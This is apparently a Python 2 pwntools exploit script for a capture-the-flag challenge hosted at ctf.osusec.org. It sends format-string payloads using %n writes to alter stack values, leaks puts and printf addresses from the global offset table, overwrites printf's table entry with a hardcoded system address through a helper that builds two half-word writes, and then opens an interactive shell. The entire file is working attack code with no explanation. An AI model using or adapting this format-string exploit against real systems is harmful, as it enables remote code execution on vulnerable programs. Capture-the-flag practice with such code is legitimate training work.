from pwn import *
from LibcSearcher import *

r = remote("ctf.osusec.org",10005)
print "> " , r.recv()

"""
payload = "%38$x"
r.send(payload + "\n")
print "> " , r.recv()
"""

elf = ELF('./restricted')
print(elf)
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
printf_plt =elf.plt["printf"]
printf_got = elf.got["printf"]
print(dir(elf))
print(hex(elf.entry))
print(hex(elf.symbols["safe"]))
print(puts_plt,puts_got)
old_ebp = 0xffffdd38 
addr_n = old_ebp - 144

#change i
payload = "%9x%8$n"
r.send(payload + "\n")
print "> " , r.recv()

#change n
payload = "%9x%9$n"
r.send(payload + "\n")
print "> " , r.recv()

#change n more
payload = "%99x%9$n"
r.send(payload + "\n")
print "> " , r.recv()

#read ret addr
payload = "%39$x"
r.send(payload + "\n")
print "> " , r.recv()
print "> " , r.recv()
offset =   int(r.recv(),16) & 0xfffff000

puts_plt = puts_plt + offset
puts_got = puts_got + offset
printf_got = printf_got + offset
print(hex(puts_plt),hex(puts_got))


payload = p32(puts_got) + p32(printf_got) + "%10$s|%11$s"
r.send(payload + "\n")
recv = r.recv() 
puts = u32(recv[8:12])
recv = recv.split("|")[1]
printf = u32(recv[:4])
"""

libc = LibcSearcher('puts', puts)
libc.add_condition("printf", printf)
print(hex(printf),hex(puts))
libc_base = puts - libc.dump('puts')

system = libc_base + libc.dump('system')
print(repr(system))
print(hex(system))
"""
system = p32(0xf7e62310)

def make_format_payload(target,val):
  print(hex(val))
  low = val & 0xffff
  high = val >> 16 
  target_addr = p32(target)
  target_addr2 = p32(target + 2)
  print(hex(target+2))
  payload = target_addr + target_addr2+"%" + str(low-8) +"x" + "%10$n" 
  if(high > low) :
    remain = high - low 
  else:
    remain = 0x10000 + high - low
  payload += "%" + str(remain) + "x" + "%11$n"
  return payload

payload = make_format_payload(printf_got,u32(system))
print(payload)
r.sendline(payload)
r.sendline("sera")
r.interactive()
